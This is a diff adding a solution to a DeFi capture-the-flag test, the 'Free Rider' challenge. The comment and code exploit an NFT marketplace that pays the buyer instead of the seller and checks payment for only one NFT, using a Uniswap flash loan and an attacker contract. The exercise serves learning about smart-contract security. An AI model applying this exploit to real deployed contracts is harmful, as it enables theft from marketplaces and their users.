@@ -104,6 +104,54 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
+        /**
+         * @dev
+         * There are two flaws in the marketplace contract:
+         * 
+         * 1- an interesting violation of the Check-Effects-Interaction pattern: in _buyOne(), the contract transfers the NFT to the buyer BEFORE paying the owner (lines 77-80)
+         * As a result, when paying the owner, the contract is sending the ETH back to the buyer, because at this point he is now the NFT owner!
+         * 
+         * 2-the contract checks the buyer is sending enough ETH to purchase the NFTs in _buyOne(). This means no matter how many NFTs we want to purchase through buyMany(), the contract will only check we have sent enough to buy one, recursively.
+         * 
+         * From these two properties we gather that to perform the attack, we simply need to "borrow" (flaw 1: the marketplace will transfer us back the ETH) 15 ETH (flaw 2: the marketplace only checks we have enough to purchase 1 NFT, priced at 15 ETH)
+         * We can use the Uniswap V2 protocol to perform a flash loan of 15 WETH, then swap this WETH against ETH before calling buyMany([0, 1, 2, 3, 4, 5]): We will buy all NFTs for the price of one.
+         * We can then transfer all the NFTs to the buyer's contract, and swap back our ETH against WETH to pay back the flash loan.
+         */
+        const logBalances = async (_address, name) => {
+            const _balanceETH = await ethers.provider.getBalance(_address);
+            console.log(
+              `\u001b[1;33mThere is ${ethers.utils.formatEther(_balanceETH)} ETH in ${name}`
+            );
+            const _balanceNFTS = await this.nft.balanceOf(_address);
+            console.log(`There is ${_balanceNFTS} NFTs in ${name}`);
+        }
+        await logBalances(this.buyerContract.address, 'the buyer contract');
+        await logBalances(this.marketplace.address, 'the marketplace');
+        console.log('');
+
+        //deploy our attacker contract
+        const AttackerFactory = await ethers.getContractFactory(
+          'MarketplaceAttack',
+          attacker
+        );
+        this.attackmarket = await AttackerFactory.deploy(
+          this.marketplace.address,
+          this.uniswapFactory.address,
+          this.nft.address,
+          this.token.address,
+          this.weth.address,
+          this.buyerContract.address,
+          attacker.address
+        );
+
+        console.log(`\u001b[1;35mStarting the attack`);
+        
+        await this.attackmarket.connect(attacker).flashSwap(this.weth.address, NFT_PRICE, { gasLimit: 1e7});
+        await logBalances(this.buyerContract.address, 'the buyer contract');
+        await logBalances(this.marketplace.address, 'the marketplace');
+        await logBalances(attacker.address, "our attacker's wallet");
+
+        
         /** CODE YOUR EXPLOIT HERE */
     });
 
